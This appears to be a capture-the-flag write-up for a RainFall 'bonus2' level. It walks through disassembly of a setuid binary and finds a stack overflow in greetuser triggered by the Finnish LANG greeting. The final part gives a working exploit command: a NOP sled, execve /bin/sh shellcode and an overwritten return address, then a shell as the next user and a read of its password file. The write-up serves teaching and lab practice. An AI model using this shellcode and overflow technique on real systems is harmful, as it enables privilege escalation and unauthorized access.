```
bonus2@RainFall:~$ ll
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2*
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
bonus2@RainFall:~$ objdump -S -M intel ./bonus2 > /tmp/c
bonus2@RainFall:~$ vim /tmp/c
```

Ok So as usual we begin with a simple stack frame, to make sure everything is aligned and working properly
```
8048532:       81 ec a0 00 00 00       sub    esp,0xa0
```
We have a 160bytes of buffer, good to know

```
8048532:       81 ec a0 00 00 00       sub    esp,0xa0
8048538:       83 7d 08 03             cmp    DWORD PTR [ebp+0x8],0x3
804853c:       74 0a                   je     8048548 <main+0x1f>
804853e:       b8 01 00 00 00          mov    eax,0x1
8048543:       e9 e8 00 00 00          jmp    8048630 <main+0x107>
```
For the first time, we check whether our user has entered input values or not.
So if we have 3 args, we go to 8048548 which is the next step if not, we just return.

```
8048548:       8d 5c 24 50             lea    ebx,[esp+0x50]
804854c:       b8 00 00 00 00          mov    eax,0x0
8048551:       ba 13 00 00 00          mov    edx,0x13
8048556:       89 df                   mov    edi,ebx
8048558:       89 d1                   mov    ecx,edx
```
ebx is now a buffer of 80 bytes
eax, is NULL
edx, is 19
edi, is a pointer to the buffer
ecx, is 19 too

```
804855a:       f3 ab                   rep stos DWORD PTR es:[edi],eax
804855c:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
804855f:       83 c0 04                add    eax,0x4
8048562:       8b 00                   mov    eax,DWORD PTR [eax]
8048564:       c7 44 24 08 28 00 00    mov    DWORD PTR [esp+0x8],0x28
```
Ok so here we do a while,
this while writes into edi, for 19 DWORD which is size 4 (19 because ecx is the counter, which means 4 * 19 = 76) it writes eax, which is 0.
So we fill edi with NULL
So we have a memset, and more precisly a bzero

```
804855c:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
804855f:       83 c0 04                add    eax,0x4
8048562:       8b 00                   mov    eax,DWORD PTR [eax]
8048564:       c7 44 24 08 28 00 00    mov    DWORD PTR [esp+0x8],0x28
804856b:       00
804856c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
8048570:       8d 44 24 50             lea    eax,[esp+0x50]
8048574:       89 04 24                mov    DWORD PTR [esp],eax
8048577:       e8 44 fe ff ff          call   80483c0 <strncpy@plt>
```
There we begin by puting the av into eax, then taking the first av[1], 
With that we push 40 in the stack, then we push our av[1], and to finish we push the buffer that we created earlier into strncpy.
Then we call strncpy reminder, our buffer a 80bytes large buffer, but we copy 40, So we did not overflow here,
moreover there are still half the size remaining

```
804857c:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
804857f:       83 c0 08                add    eax,0x8
8048582:       8b 00                   mov    eax,DWORD PTR [eax]
8048584:       c7 44 24 08 20 00 00    mov    DWORD PTR [esp+0x8],0x20
804858b:       00
804858c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
8048590:       8d 44 24 50             lea    eax,[esp+0x50]
8048594:       83 c0 28                add    eax,0x28
8048597:       89 04 24                mov    DWORD PTR [esp],eax
804859a:       e8 21 fe ff ff          call   80483c0 <strncpy@plt>
```
this time we do the same thing but we take the av[2]
we copy 32 characters and we offset the buffer by doing + 0x28 (40) so that we do not smash the last strncpy
So if we read 40 + 32, that means we have 72 characters filled. So we still have 4 more that are initializes to 0 and 4 more that are uninisialized

```
804859f:       c7 04 24 38 87 04 08    mov    DWORD PTR [esp],0x8048738
80485a6:       e8 d5 fd ff ff          call   8048380 <getenv@plt>
```
We can see first that we move somthing in the stack, what is it ?
it is a string, how do we know ? by goind into gdb,
```
bonus2@RainFall:~$ gdb --tui ./bonus2
(gdb) x/s 0x804873
"LANG"
```
So we know that this is LANG and that it is put into the getenv, so if we change the enrionment path the result should change too
for the moment let's continue the analysis
```
80485ab:       89 84 24 9c 00 00 00    mov    DWORD PTR [esp+0x9c],eax
80485b2:       83 bc 24 9c 00 00 00    cmp    DWORD PTR [esp+0x9c],0x0
80485b9:       00
80485ba:       74 5c                   je     8048618 <main+0xef>
80485bc:       c7 44 24 08 02 00 00    mov    DWORD PTR [esp+0x8],0x2
80485c3:       00
80485c4:       c7 44 24 04 3d 87 04    mov    DWORD PTR [esp+0x4],0x804873d
80485cb:       08
80485cc:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
80485d3:       89 04 24                mov    DWORD PTR [esp],eax
80485d6:       e8 85 fd ff ff          call   8048360 <memcmp@plt>
```
The eax, at this point is equal to the return value of the getenv, so we put the return value onto the stack
we compare it to NULL just to make sure that we did not find nothing
we will see later what happends if it's NULL
now if it's good, we put 2 in the third argument of the function we will call,
we put somthing else to let's see in gdb
```
bonus2@RainFall:~$ gdb --tui ./bonus2
(gdb) x/s 0x804873d
fi
```
So we put fi in there,
then we put the LANG environment variable,
which means, we are going to compare the value of the EV (environment variable)
```
test   eax,eax
80485dd:       75 0c                   jne    80485eb <main+0xc2>
80485df:       c7 05 88 99 04 08 01    mov    DWORD PTR ds:0x8049988,0x1
80485e6:       00 00 00
80485e9:       eb 2d                   jmp    8048618 <main+0xef>
80485eb:       c7 44 24 08 02 00 00    mov    DWORD PTR [esp+0x8],0x2
80485f2:       00
80485f3:       c7 44 24 04 40 87 04    mov    DWORD PTR [esp+0x4],0x8048740
80485fa:       08
80485fb:       8b 84 24 9c 00 00 00    mov    eax,DWORD PTR [esp+0x9c]
8048602:       89 04 24                mov    DWORD PTR [esp],eax
8048605:       e8 56 fd ff ff          call   8048360 <memcmp@plt>
```
Ok this time we begin by verifying whether our return value is 0 or not.
if it is that means that we begin by fi...
if it's not starting by that jump 3 lines further.
If it is then we put a global variable to 1 (0x8049988)
and then we jmp
Let's begin with what happens when it's not equal.
So we put the global to 1, 
then we mov 2 to the stack we push it along with an unknow value that we will see on gdb:

```
bonus2@RainFall:~$ gdb --tui ./bonus2
(gdb) x/s 0x8048740
nl
```
So we push nl, and we still compare it to the EV
So this whole code would be like an 
if 
else if
else

```
804860a:       85 c0                   test   eax,eax
804860c:       75 0a                   jne    8048618 <main+0xef>
804860e:       c7 05 88 99 04 08 02    mov    DWORD PTR ds:0x8049988,0x2
8048615:       00 00 00
8048618:       89 e2                   mov    edx,esp
804861a:       8d 5c 24 50             lea    ebx,[esp+0x50]
804861e:       b8 13 00 00 00          mov    eax,0x13
8048623:       89 d7                   mov    edi,edx
8048625:       89 de                   mov    esi,ebx
8048627:       89 c1                   mov    ecx,eax
8048629:       f3 a5                   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
804862b:       e8 54 fe ff ff          call   8048484 <greetuser>
```
These are the last commands of the main:
like the last time we begin by comparing the eax with itself to see if it's 0
like last time we put a value in the global this time it's 2
if it's not then we jump to the same place as last time (8048618) (we will see later)
ok this time what happens though,
we set up variables the exact same way as the last time with the bzero like.
but this time instead of puting 0, we do like a cpy of the chars,
so let's analyse
edx = esp
eax = 0x13 (19)
edi = edx (so it's equal to esp)
esi = ebx (the buffer of 0x50)
ecx = eax (19)
then we rep a movs 4bytes of the value of esi (which is the buffer), into edi, which is the beginning of the stack frame
then we call greetuser with no values
but because we copied the buffer at the beginning of the stack frame the greetuser has access to it
so it's like we pushed it.

Now let's come back to the code that we have left on the side since earlier
We have already explained it x) it is the mov edx, esp
good job
We can now go to the greetuser

greetuser:
Most important:
```
8048487:       83 ec 58                sub    esp,0x58
```
A buffer of 88

```
804848a:       a1 88 99 04 08          mov    eax,ds:0x8049988
804848f:       83 f8 01                cmp    eax,0x1
8048492:       74 26                   je     80484ba <greetuser+0x36>
```
Ok so here we have the global being passed down to eax, then compared to 1,
let's jump directly to this code.
```
80484ba:       ba 17 87 04 08          mov    edx,0x8048717
80484bf:       8d 45 b8                lea    eax,[ebp-0x48]
80484c2:       8b 0a                   mov    ecx,DWORD PTR [edx]
80484c4:       89 08                   mov    DWORD PTR [eax],ecx
80484c6:       8b 4a 04                mov    ecx,DWORD PTR [edx+0x4]
80484c9:       89 48 04                mov    DWORD PTR [eax+0x4],ecx
80484cc:       8b 4a 08                mov    ecx,DWORD PTR [edx+0x8]
80484cf:       89 48 08                mov    DWORD PTR [eax+0x8],ecx
80484d2:       8b 4a 0c                mov    ecx,DWORD PTR [edx+0xc]
80484d5:       89 48 0c                mov    DWORD PTR [eax+0xc],ecx
80484d8:       0f b7 4a 10             movzx  ecx,WORD PTR [edx+0x10]
80484dc:       66 89 48 10             mov    WORD PTR [eax+0x10],cx
80484e0:       0f b6 52 12             movzx  edx,BYTE PTR [edx+0x12]
80484e4:       88 50 12                mov    BYTE PTR [eax+0x12],dl
80484e7:       eb 21                   jmp    804850a <greetuser+0x86>
```
So we begin with an unknown value so let's watch it
```
(gdb) x/s 0x8048717
0x8048717:       "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
```
Ok so we have really weird charactersm you also can gave blinking "\_" because why not.
So what are those, those are simply non ascci characters,
If we remember we optain those whenever we have "fi" in the LANG EV.
So that means that it could be Finnish
let's try to put our export to fi
```
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ ./bonus2 "coucou" coucou
Hyvää päivää coucou
```
And here we go.
So we have found what they are let's continue on the code. (this was only the first line)

So if we do 0x58 - 0x48 = 0x10, which is 16, So the buffer is 16 bytes long
In this buffer what to we put ?
We begin by puting the first letter of edx with ecx as a tmp var
and we do THE EXACT SAME THING 4 times in total.
then we do the same but with WORD instead of DWORD
and lastly with BYTE.
Why ? because now we have copied 19 characters:
4 * DWORD + 1 * WORD + BYTE <=> 4 * 4 + 1 * 2 + 1 = 19
So he have copied characters
**GGs here we have an overflow**
So to finish. All this is a Flipping memcpy optimised for ASM, hard coded for 19 bytes with a buffer of 16.
But we can't copy any kind of Hello,
We have to take the finnish one, why ? because of the characters that we saw earlier, they are not ascii characters but UTF-8, which means that they are coded on 2 bytes insteadof one !
Hyvää päivää -> pure length = 14.
Hyvää päivää -> memory length = 18 (there is a space)
Yes just enough to go beyoud the buffer
Yes 30 lines just for that.
```
804850a:       8d 45 08                lea    eax,[ebp+0x8]
804850d:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
8048511:       8d 45 b8                lea    eax,[ebp-0x48]
8048514:       89 04 24                mov    DWORD PTR [esp],eax
8048517:       e8 54 fe ff ff          call   8048370 <strcat@plt>
804851c:       8d 45 b8                lea    eax,[ebp-0x48]
804851f:       89 04 24                mov    DWORD PTR [esp],eax
8048522:       e8 69 fe ff ff          call   8048390 <puts@plt>
```
Then the code jumps right here.
we put our buffer copied from the esp+50 from the main into the eax.
push it into the second value of our strcat
to finish we put our wonderfully awful buffer
and here we go we push,
strcat,
and then we put the first buffer that could have overflow into eax and to finish we push and puts it

let's now exploit.
```
bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write(b"\x90" * 11 +  b"\x31\xD2\xB8\xFF\x2F\x73\x68\xC1\xE8\x08\x50\xB8\x2F\x62\x69\x6E\x50\x89\xE3\x52\x53\x89\xE1\x31\xC0\xB0\x0B\xCD\x80")') $(python2 -c 'import sys; sys.stdout.write(b"a" * 18 + b"\x23\xf6\xff\xbf")')
```
How does this work ?
So we have our nop sledge to make sure that the shell code will get executed + our shell code, which in total makes 40 characters
then in the second one what do we have ?
We have 18 A, which are here to smash everything until the return value is reached, and for the return value we put the adress of our buffer
(got with gdb)
```
(gdb) b *0x0804862b
(gdb) start "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
(gdb) c
(gdb) x/20wx $esp
0xbffff600:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff610:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff620:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff630:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff640:     0x41414141      0x41414141      0x00000000      0xb7e5ec73
```
And the place where the 41 starts are the buffer, the only thing that changes is that gdb adds more environment Variables so we have to change the adress 
a little, lucky for you it changes of 32
so: 0xbffff600 -> 0xbffff603 (to be on the nop sledge for sure)
0xbffff623 -> the offset because of gdb
```
bonus2@RainFall:~$ ./bonus2 $(python2 -c 'import sys; sys.stdout.write(b"\x90" * 11 +  b"\x31\xD2\xB8\xFF\x2F\x73\x68\xC1\xE8\x08\x50\xB8\x2F\x62\x69\x6E\x50\x89\xE3\x52\x53\x89\xE1\x31\xC0\xB0\x0B\xCD\x80")') $(python2 -c 'import sys; sys.stdout.write(b"a" * 18 + b"\x23\xf6\xff\xbf")')
Hyvää päivää �S�
                aaaaaaaaaaaaaaaaaa#
$ whoami
bonus3
$ cd ../bonus3
$ ls -la
total 17
dr-xr-x---+ 1 bonus3 bonus3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus3 bonus3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus3 bonus3 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus3 bonus3   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus3 bonus3  675 Apr  3  2012 .profile
-rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
$ cat .pass
<hidden>
```
